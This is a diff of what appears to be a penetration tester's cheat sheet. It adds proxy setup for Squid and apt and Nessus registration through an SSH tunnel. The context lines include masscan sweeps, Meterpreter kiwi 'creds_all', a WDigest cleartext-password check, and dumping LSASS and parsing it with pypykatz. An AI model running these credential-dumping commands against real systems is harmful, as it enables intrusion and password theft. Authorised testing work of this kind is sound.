@@ -186,6 +186,37 @@ masscan -p 1-65535 --rate=200 10.50.60.210 -e tap0 --router-ip 10.50.60.210
 
 
 ##############################
+##### MAC HOMEBREW SQUID #####
+##############################
+brew install squid
+brew services start squid
+
+##############################
+#####   APT PROXY     ########
+##############################
+cat << 'EOF' > /etc/apt/apt.conf.d/12proxy
+Acquire::http::proxy "socks5h://127.0.0.1:1080";
+Acquire::https::proxy "socks5h://127.0.0.1:1080";
+EOF
+
+cat << 'EOF' > /etc/apt/apt.conf.d/12proxy
+Acquire::http::proxy "http://127.0.0.1:3128";
+Acquire::https::proxy "http://127.0.0.1:3128";
+EOF
+
+##############################
+#####   NESSUS        ########
+##############################
+#nessus registration through http proxy via ssh tunnel
+sudo /opt/nessus/sbin/nessuscli fix --secure --set proxy=127.0.0.1
+sudo /opt/nessus/sbin/nessuscli fix --secure --set proxy_port=3128
+
+/opt/nessus/sbin/nessuscli fetch --register xxxx-xxxx-xxxx-xxxx
+
+
+systemctl start nessusd
+
+##############################
 ##### NC              ########
 ##############################
 nc -nvzw1 <ip> <port>
@@ -576,6 +607,10 @@ load kiwi
 creds_all
 
 
+###################################
+# Check WDIGEST                   #
+###################################
+
 # if UseLogonCredential set to 1, lsass will store clear-text passwords in mem
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
 
@@ -590,6 +625,7 @@ get lsassdump.dmp
 del lsassdump.dmp
 del procdump64.exe
 pypykatz lsa minidump lsassdump.dmp
+
 
 
 ##################################
